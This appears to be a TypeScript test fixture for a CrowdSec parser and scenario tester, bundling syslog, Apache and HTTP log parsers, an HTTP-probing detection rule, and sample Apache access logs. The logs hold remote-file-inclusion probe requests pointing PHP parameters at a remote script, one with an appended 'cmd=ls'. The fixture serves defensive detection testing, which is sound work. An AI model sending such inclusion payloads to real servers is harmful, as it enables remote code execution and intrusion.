export interface TestEnvFile {
  name: string
  text: string
}

export const TEST_ENV = {
  parserFiles: [
    {
      name: 's00-syslog-logs.yaml',
      text: String.raw`filter: "evt.Line.Labels.type == 'syslog'"
onsuccess: next_stage
pattern_syntax:
  RAW_SYSLOG_PREFIX: '^<%{NUMBER:syslog_priority}>%{NUMBER:syslog_version} %{SYSLOGBASE2} %{DATA:program} (?:%{NUMBER:pid}|-)'
  RAW_SYSLOG_META: '\\[meta sequenceId="%{NOTDQUOTE:seq_id}"\\]'
name: crowdsecurity/syslog-logs
nodes:
  - grok:
      pattern: "^%{SYSLOGLINE}"
      apply_on: Line.Raw
  - grok:
      pattern: '%{RAW_SYSLOG_PREFIX} - (?:%{RAW_SYSLOG_META} |- )%{GREEDYDATA:message}'
      apply_on: Line.Raw
statics:
  - meta: machine
    expression: evt.Parsed.logsource
  - parsed: "logsource"
    value: "syslog"
  - target: evt.StrTime
    expression: evt.Parsed.timestamp
  - target: evt.StrTime
    expression: evt.Parsed.timestamp8601
  - meta: datasource_path
    expression: evt.Line.Src
  - meta: datasource_type
    expression: evt.Line.Module
---
filter: "evt.Line.Labels.type not in ['syslog', 'unifi']"
onsuccess: next_stage
name: crowdsecurity/non-syslog
statics:
  - parsed: message
    expression: evt.Line.Raw
  - parsed: program
    expression: evt.Line.Labels.type
  - meta: datasource_path
    expression: evt.Line.Src
  - meta: datasource_type
    expression: evt.Line.Module`,
    },
    {
      name: 's01-apache2-logs.yaml',
      text: String.raw`filter: "evt.Parsed.program startsWith 'apache2'"
onsuccess: next_stage
name: crowdsecurity/apache2-logs
description: "Parse Apache2 access and error logs"
nodes:
  - grok:
      pattern: '(%{IPORHOST:target_fqdn}(:%{INT:port})? )?%{COMMONAPACHELOG}( "%{NOTDQUOTE:referrer}" "%{NOTDQUOTE:http_user_agent}")?'
      apply_on: message
      statics:
        - meta: log_type
          value: http_access-log
        - target: evt.StrTime
          expression: evt.Parsed.timestamp
        - meta: service
          value: http
        - meta: source_ip
          expression: evt.Parsed.clientip
        - meta: http_status
          expression: evt.Parsed.response
        - meta: http_path
          expression: "evt.Parsed.request != '' ? evt.Parsed.request : evt.Parsed.rawrequest"
        - meta: http_verb
          expression: "evt.Parsed.verb"
        - meta: http_user_agent
          expression: "evt.Parsed.http_user_agent"
        - meta: target_fqdn
          expression: "evt.Parsed.target_fqdn"
    onsuccess: next_stage`,
    },
    {
      name: 's02-http-logs.yaml',
      text: String.raw`filter: "evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']"
description: "Parse more Specifically HTTP logs, such as HTTP Code, HTTP path, HTTP args and if its a static ressource"
name: crowdsecurity/http-logs
pattern_syntax:
  DIR: "^.*/"
  FILE: "[^/].*?"
  EXT: "\\\\.[^.]*$|$"
nodes:
  - statics:
     - parsed: "impact_completion"
       expression: "evt.Meta.http_status in ['404', '403', '502'] ? 'false' : 'true'"
     - target: evt.Parsed.static_ressource
       value: 'false'
  - grok:
      pattern: "^%{GREEDYDATA:request}\\?%{GREEDYDATA:http_args}$"
      apply_on: request
  - grok:
      pattern: "%{DIR:file_dir}(%{FILE:file_frag}%{EXT:file_ext})?"
      apply_on: request
      statics:
        - meta: http_path
          expression: "evt.Parsed.http_path"
        - meta: http_args_len
          expression: "len(evt.Parsed.http_args)"
        - parsed: file_name
          expression: evt.Parsed.file_frag + evt.Parsed.file_ext
        - parsed: static_ressource
          expression: "Upper(evt.Parsed.file_ext) in ['.JPG', '.CSS', '.JS', '.JPEG', '.PNG', '.SVG', '.MAP', '.ICO', '.OTF', '.GIF', '.MP3', '.MP4', '.WOFF', '.WOFF2', '.TTF', '.OTF', '.EOT', '.WEBP', '.WAV', '.GZ', '.BROTLI', '.BVR', '.TS', '.BMP', '.AVIF', '.MJS'] ? 'true' : 'false'"`,
    },
  ] as TestEnvFile[],
  scenarioFiles: [
    {
      name: 'http-probing.yaml',
      text: String.raw`type: leaky
name: crowdsecurity/http-probing
description: "Detect site scanning/probing from a single ip"
filter: "evt.Meta.service == 'http' && evt.Meta.http_status in ['404', '403', '400'] && evt.Parsed.static_ressource == 'false'"
groupby: "evt.Meta.source_ip + '/' + evt.Parsed.target_fqdn"
distinct: "evt.Meta.http_path"
capacity: 10
reprocess: true
leakspeed: "10s"
blackhole: 5m
labels:
  remediation: true
  classification:
    - attack.T1595
  behavior: "http:scan"
  label: "HTTP Probing"
  spoofable: 0
  service: http
  confidence: 1`,
    },
  ] as TestEnvFile[],
  logsText: String.raw`172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /src/scripture.php?pageHeaderFile=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /starnet/themes/c-sky/main.inc.php?cmsdir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /start.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /start.php?pg=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stat_modules/users_age/module.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stats.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stats.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stphpapplication.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stphpbtnimage.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /stphpform.php?STPHPLIB_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /str.php?p=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196
172.17.0.1 - - [29/Sep/2021:12:37:05 +0000] "GET /streamline-1.0-beta4/src/core/theme/includes/account_footer.php?sl_theme_unix_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 196`,
  defaultLogType: 'apache2',
}
